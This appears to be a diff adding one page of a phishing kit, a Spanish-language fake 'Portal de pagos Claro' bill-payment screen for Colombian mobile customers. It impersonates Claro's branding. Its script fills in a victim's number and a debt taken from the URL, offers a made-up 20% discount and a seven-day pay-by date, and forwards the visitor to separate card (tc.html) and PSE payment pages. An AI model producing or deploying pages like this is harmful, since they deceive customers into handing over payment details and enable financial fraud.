@@ -1,0 +1,331 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="icon" type="image/png" href="img/favicon.ico" />
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300..800;1,300..800&display=swap"
+    rel="stylesheet" />
+  <title>Portal de pagos Claro</title>
+
+  <style>
+    body {
+      font-family: "Open Sans", system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+    }
+
+    #loader-container {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.5);
+      z-index: 1000;
+      justify-content: center;
+      align-items: center;
+    }
+
+    #loader {
+      width: 3.25em;
+      transform-origin: center;
+      animation: rotate4 2s linear infinite;
+    }
+
+    circle {
+      fill: none;
+      stroke: hsl(0, 97%, 59%);
+      stroke-width: 2;
+      stroke-dasharray: 1, 200;
+      stroke-dashoffset: 0;
+      stroke-linecap: round;
+      animation: dash4 1.5s ease-in-out infinite;
+    }
+
+    @keyframes rotate4 {
+      100% {
+        transform: rotate(360deg);
+      }
+    }
+
+    @keyframes dash4 {
+      0% {
+        stroke-dasharray: 1, 200;
+        stroke-dashoffset: 0;
+      }
+
+      50% {
+        stroke-dasharray: 89, 200;
+        stroke-dashoffset: -35;
+      }
+
+      100% {
+        stroke-dasharray: 89, 200;
+        stroke-dashoffset: -124;
+      }
+    }
+  </style>
+</head>
+
+<body class="bg-white text-gray-800 antialiased">
+  <div class="px-6 flex items-center justify-between h-10">
+    <div class="flex items-center gap-8">
+      <p class="text-sm text-[#313131] font-semibold border-b-4 border-[#FFC73C]">Personas</p>
+      <p class="hidden md:block text-sm text-[#313131] font-semibold hover:border-b-4 hover:border-[#FFC73C]">Negocios
+      </p>
+      <p class="hidden md:block text-sm text-[#313131] font-semibold hover:border-b-4 hover:border-[#FFC73C]">Empresas
+      </p>
+      <p class="hidden md:block text-sm text-[#313131] font-semibold hover:border-b-4 hover:border-[#FFC73C]">
+        Institucional</p>
+    </div>
+
+    <div class="flex items-center gap-4">
+      <div class="flex items-center gap-2 text-sm text-[#313131] font-semibold">
+        Más de Claro
+        <svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4" viewBox="0 0 24 24" fill="currentColor">
+          <path d="M18 9c.852 0 1.297 .986 .783 1.623l-.076 .084l-6 6a1 1 0 0 1 -1.32 .083l-.094 -.083l-6 -6z" />
+        </svg>
+      </div>
+
+      <div class="flex items-center gap-2 text-sm text-[#313131] font-semibold">
+        <img class="w-5 h-5" src="./assets/flag-colombia.svg" alt="">
+        <svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4" viewBox="0 0 24 24" fill="currentColor">
+          <path d="M18 9c.852 0 1.297 .986 .783 1.623l-.076 .084l-6 6a1 1 0 0 1 -1.32 .083l-.094 -.083l-6 -6z" />
+        </svg>
+      </div>
+    </div>
+  </div>
+
+  <header class="bg-[#EF3320] h-14 flex items-center px-4 md:px-10 justify-between">
+    <div class="flex items-center gap-4">
+      <svg xmlns="http://www.w3.org/2000/svg" class="md:hidden w-6 h-6 text-white" viewBox="0 0 24 24" fill="none"
+        stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M4 6h16M4 12h16M4 18h16" />
+      </svg>
+
+      <img class="w-20" src="./assets/claro.svg" alt="Claro">
+
+      <nav class="hidden md:flex items-center gap-6 text-white">
+        <div class="flex items-center gap-1">
+          <span class="text-sm font-bold">Servicios</span>
+          <svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4" viewBox="0 0 24 24" fill="white">
+            <path d="M18 9c.852 0 1.297 .986 .783 1.623l-.076 .084l-6 6a1 1 0 0 1 -1.32 .083l-.094 -.083l-6 -6z" />
+          </svg>
+        </div>
+        <div class="flex items-center gap-1">
+          <span class="text-sm font-bold">Tienda</span>
+          <svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4" viewBox="0 0 24 24" fill="white">
+            <path d="M18 9c.852 0 1.297 .986 .783 1.623l-.076 .084l-6 6a1 1 0 0 1 -1.32 .083l-.094 -.083l-6 -6z" />
+          </svg>
+        </div>
+        <div class="flex items-center gap-1">
+          <span class="text-sm font-bold">Soporte</span>
+          <svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4" viewBox="0 0 24 24" fill="white">
+            <path d="M18 9c.852 0 1.297 .986 .783 1.623l-.076 .084l-6 6a1 1 0 0 1 -1.32 .083l-.094 -.083l-6 -6z" />
+          </svg>
+        </div>
+      </nav>
+    </div>
+
+    <div class="flex items-center gap-3">
+      <div class="hidden md:flex items-center gap-3 text-white">
+        <span class="text-xs font-semibold">Información importante para usuarios</span>
+        <svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4" viewBox="0 0 24 24" fill="white">
+          <path d="M18 9c.852 0 1.297 .986 .783 1.623l-.076 .084l-6 6a1 1 0 0 1 -1.32 .083l-.094 -.083l-6 -6z" />
+        </svg>
+      </div>
+
+      <button class="flex items-center gap-2 rounded-full px-4 h-10 bg-[#D01508] text-white font-bold">
+        <img class="w-6 h-6" src="./assets/c2btn.png" alt="">
+        Mi Claro
+      </button>
+    </div>
+  </header>
+
+  <main class="px-4 md:px-10 py-6">
+    <div id="ggris1" class="bg-gray-50 rounded-xl p-6 shadow-sm">
+      <div class="text-gray-700">
+        <p class="text-xl font-semibold">
+          Portal de <span class="text-[#EF3320]">PAGOS <span class="font-normal">Y RECARGAS</span></span>
+        </p>
+      </div>
+    </div>
+
+    <div class="mt-6 overflow-x-auto">
+      <div class="flex items-center justify-between max-w-4xl mx-auto">
+        <div class="flex flex-col items-center">
+          <img id="azul1" src="img/icono-seleccion-on.png" class="w-12 h-12" alt="">
+          <p class="mt-2 text-center font-semibold">Ingresa<br>tu Documento</p>
+        </div>
+        <div class="flex flex-col items-center">
+          <img id="azul2" src="img/icono-mediopago-on.png" class="w-12 h-12" alt="">
+          <p class="mt-2 text-center font-semibold text-[#EF3320]">Escoge el<br>medio de pago</p>
+        </div>
+        <div class="flex flex-col items-center">
+          <img id="azul3" src="img/icono-pago-off.png" class="w-12 h-12" alt="">
+          <p class="mt-2 text-center font-semibold">Realiza el<br>Pago en linea</p>
+        </div>
+        <div class="flex flex-col items-center">
+          <img id="azul4" src="img/icono-resultado-off.png" class="w-12 h-12" alt="">
+          <p class="mt-2 text-center font-semibold">Recibe la<br>Confirmación</p>
+        </div>
+      </div>
+    </div>
+
+    <section class="mt-6 max-w-xl mx-auto p-4 bg-white shadow-lg rounded-lg">
+      <h2 class="text-lg font-bold text-center border-b pb-2 mb-4">Paga tu factura Postpago</h2>
+      <table class="w-full text-sm text-gray-600 border-separate border-spacing-y-2">
+        <tbody>
+          <tr>
+            <td class="font-semibold text-gray-500">Valor TOTAL de saldo:</td>
+            <td id="total" class="text-right text-[#ef3829] line-through font-medium">$ 0,00</td>
+          </tr>
+          <tr>
+            <td class="font-semibold text-gray-500">Valor actual a pagar con descuento:</td>
+            <td id="total-desc" class="text-right text-[#ef3829] text-lg font-bold">$ 0,00</td>
+          </tr>
+          <tr>
+            <td class="font-semibold text-gray-500">Número Celular:</td>
+            <td id="numero-celular" class="text-right text-gray-600"></td>
+          </tr>
+          <tr>
+            <td class="font-semibold text-gray-500">Pague antes de:</td>
+            <td id="pague-antes" class="text-right text-gray-600"></td>
+          </tr>
+          <tr>
+            <td class="font-semibold text-gray-500">Valor a pagar por servicios + Suplementarios:</td>
+            <td class="text-right text-gray-600">$ 0,00</td>
+          </tr>
+          <tr>
+            <td class="font-semibold text-gray-500">Valor a pagar por equipo:</td>
+            <td class="text-right text-gray-600">$ 0,00</td>
+          </tr>
+          <tr>
+            <td class="font-semibold text-gray-500">Fecha de carga de minutos:</td>
+            <td id="carga-minutos" class="text-right text-gray-600"></td>
+          </tr>
+          <tr>
+            <td class="font-semibold text-gray-500">Referencia de pago:</td>
+            <td class="text-right text-gray-600">******6812</td>
+          </tr>
+        </tbody>
+      </table>
+    </section>
+
+    <section class="mt-8 max-w-xl mx-auto p-4">
+      <h3 class="text-base font-semibold text-gray-700">Selecciona un medio de pago</h3>
+      <div class="mt-4 space-y-4">
+        <div class="payment-option cursor-pointer flex items-center gap-4 p-3 border rounded-lg hover:bg-gray-50"
+          data-payment="tarjeta">
+          <img src="img/FORMA_PAGO_2.png" alt="Tarjeta de Crédito-Débito" class="w-10 h-10" />
+          <span class="font-medium text-gray-700">Tarjeta de Crédito-Débito</span>
+        </div>
+        <div class="payment-option cursor-pointer flex items-center gap-4 p-3 border rounded-lg hover:bg-gray-50"
+          data-payment="pse">
+          <img src="img/pse.png" alt="PSE" class="w-10 h-10" />
+          <span class="font-medium text-gray-700">PSE</span>
+        </div>
+      </div>
+    </section>
+
+    <div class="mt-8 text-center max-w-md mx-auto">
+      <button id="nextStep"
+        class="w-full h-14 rounded-xl text-white font-bold text-lg bg-gray-400 cursor-not-allowed transition-colors"
+        disabled>
+        SIGUIENTE
+      </button>
+    </div>
+  </main>
+  <br>
+  <br>
+  <footer class="mt-8">
+    <img class="hidden md:block w-full" src="./assets/footer-dk.png" alt="">
+    <img class="block md:hidden w-full" src="./assets/footer.png" alt="">
+  </footer>
+
+  <div id="loader-container">
+    <div id="loader">
+      <svg viewBox="25 25 50 50">
+        <circle r="20" cy="50" cx="50"></circle>
+      </svg>
+    </div>
+  </div>
+
+  <script>
+    document.addEventListener("DOMContentLoaded", function() {
+        const urlParams = new URLSearchParams(window.location.search);
+        const numeroCelular = urlParams.get('numero');
+        const deudaTotal = parseFloat(urlParams.get('deuda'));
+
+        const formatCurrency = (amount) => {
+            return new Intl.NumberFormat('es-CO', {
+                style: 'currency',
+                currency: 'COP',
+                minimumFractionDigits: 0,
+                maximumFractionDigits: 0
+            }).format(amount);
+        };
+
+        if (numeroCelular && !isNaN(deudaTotal)) {
+            const descuento = 0.20;
+            const deudaConDescuento = deudaTotal * (1 - descuento);
+
+            document.getElementById('numero-celular').textContent = numeroCelular;
+            document.getElementById('total').textContent = formatCurrency(deudaTotal);
+            document.getElementById('total-desc').textContent = formatCurrency(deudaConDescuento);
+        } else {
+            document.getElementById('numero-celular').textContent = 'No disponible';
+            console.error("No se encontraron parámetros de deuda válidos en la URL.");
+        }
+
+        const paymentOptions = document.querySelectorAll('.payment-option');
+        const nextStepBtn = document.getElementById('nextStep');
+        let selectedPaymentMethod = null;
+
+        paymentOptions.forEach(option => {
+            option.addEventListener('click', () => {
+                paymentOptions.forEach(opt => opt.classList.remove('border-[#EF3320]', 'bg-gray-100'));
+                option.classList.add('border-[#EF3320]', 'bg-gray-100');
+
+                selectedPaymentMethod = option.dataset.payment;
+
+                nextStepBtn.disabled = false;
+                nextStepBtn.classList.add('bg-[#EF3320]', 'hover:bg-[#d01508]');
+                nextStepBtn.classList.remove('bg-gray-400', 'cursor-not-allowed');
+            });
+        });
+
+        nextStepBtn.addEventListener('click', () => {
+            if (!nextStepBtn.disabled && selectedPaymentMethod) {
+                if (selectedPaymentMethod === 'tarjeta') {
+                    window.location.href = `tc.html?numero=${numeroCelular}&deuda=${deudaTotal}`;
+                } else if (selectedPaymentMethod === 'pse') {
+                    window.location.href = `pse.html?numero=${numeroCelular}&deuda=${deudaTotal}`;
+                }
+            }
+        });
+
+        const today = new Date();
+        const pagarAntesDe = new Date(today);
+        pagarAntesDe.setDate(today.getDate() + 7);
+        const cargaMinutos = new Date(today);
+        cargaMinutos.setDate(today.getDate() + 1);
+
+        const formatDate = (date) => {
+            const day = String(date.getDate()).padStart(2, '0');
+            const month = String(date.getMonth() + 1).padStart(2, '0');
+            const year = date.getFullYear();
+            return `${day}/${month}/${year}`;
+        };
+
+        document.getElementById('pague-antes').textContent = formatDate(pagarAntesDe);
+        document.getElementById('carga-minutos').textContent = formatDate(cargaMinutos);
+    });
+  </script>
+</body>
+
+</html>
